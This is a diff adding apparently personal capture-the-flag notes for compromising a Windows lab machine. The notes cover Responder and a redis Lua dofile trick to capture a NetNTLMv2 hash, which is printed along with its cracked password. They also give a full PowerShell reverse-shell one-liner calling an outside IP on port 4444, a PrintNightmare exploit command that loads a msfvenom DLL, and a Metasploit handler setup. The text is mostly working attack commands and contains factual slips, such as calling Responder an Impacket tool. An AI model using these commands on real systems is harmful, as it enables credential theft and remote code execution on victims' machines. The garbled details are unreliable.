@@ -1,0 +1,87 @@
+Imapcket Responser.py
+----------------------
+
+Impacket is a collection of Python classes for working with network protocols, and Responder.py is one of the tools provided in this collection.
+
+Responder.py primarily focuses on analyzing and exploiting weaknesses in network authentication protocols such as NTLM (NT LAN Manager) and others. It operates by listening for certain network traffic, such as authentication requests, and then crafting responses to these requests in order to capture authentication credentials or perform other attacks.
+
+For that, we first set up a listener using Impacket's Responder.py
+-------------------------------------------------------------------
+#sudo responder -I tun0
+
+We can use luna script(dofile) with eval command to know information
+---------------------------------------------------------------
+#redis-cli -h 10.10.245.19 eval "dofile('C:\\Windows\\Users\\enterprise-security\\user.txt')" 0
+
+Then, we use the redis eval technique to access the exposed share.
+------------------------------------------------------------------
+#redis-cli -h 10.10.245.19 eval "dofile('//10.11.60.43/test')" 0 
+
+
+NetNTLMv2 (hashcat -m 5600)
+-----------
+ENTERPRISE-SECURITY::VULNNET:18fedd697e0d28a5:971fe8b37e543b94cdf5cee229a4d50f:010100000000000000f733f07489da01fc89058fadc6d5c10000000002000800590059003800360001001e00570049004e002d00300050005a00360055005a004400330041004b00510004003400570049004e002d00300050005a00360055005a004400330041004b0051002e0059005900380036002e004c004f00430041004c000300140059005900380036002e004c004f00430041004c000500140059005900380036002e004c004f00430041004c000700080000f733f07489da0106000400020000000800300030000000000000000000000000300000f053097df87eb416902ca92dbd0749d3255dcf31aed25e2d2e5243193da514f40a001000000000000000000000000000000000000900200063006900660073002f00310030002e0034002e00370033002e003100370036000000000000000000:sand_0873959498
+
+enterprise-security:sand_0873959498 (username & password)
+
+Enterprise-Share(smb share)
+
+Powershell (reverse-shell)
+---------------------------
+
+$client = New-Object System.Net.Sockets.TCPClient("10.11.60.43",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+
+#whoami /priv
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+Print Nightmare vulnerability
+-------------------------------
+
+
+Print Nightmare is a critical Remote Code Execution (RCE) vulnerability, officially known as CVE-2021–34527, that affects          (Microsoft’s Windows Print Spooler service). The vulnerability allows attackers to exploit the “RpcAddPrinterDriverEx()” function, which is responsible for installing printer drivers on the system. By leveraging this vulnerability, hackers can gain unauthorized access to a vulnerable system.
+
+The Windows Print Spooler service acts as a bridge between the operating system and printers, handling tasks such as managing printer drivers and processing print jobs. However, the Print Nightmare exploit enables the installation of malicious print drivers remotely, posing a significant security risk. This vulnerability is particularly dangerous because it allows both trusted and authenticated users to install arbitrary print drivers on Windows systems.
+
+To detect print nightmare vulnerability
+--------------------------------------------
+#python3 rpcdump.py @10.10.227.30 | egrep 'MS-RPRN|MS-PAR'
+
+Protocol: [MS-RPRN]: Print System Remote Protocol 
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
+
+Impacket virtual-environment
+-----------------------------
+#virtualenv --python=python3 impacket
+#source impacket/bin/activate
+
+
+CVE-2021-1675(PrintNightmare),smbserver and shell.dll(from msfvenom) must be under same directory
+
+Change CVE-2021-1675 into lee.py(another name)
+
+#python3 lee.py VULNNET/enterprise-security:'sand_0873959498'@10.10.4.112 '\\10.4.73.176\share\shell.dll'
+
+Established smbserver 
+---------------------
+#sudo smbserver.py share '$PWD' -smb2support
+
+
+#msfconsole -q
+#use multi/handler
+#set payload windows/x64/meterpreter/reverse_tcp
+#set LHOST tun0
+#set LPORT 4444
+#run
+
+
+
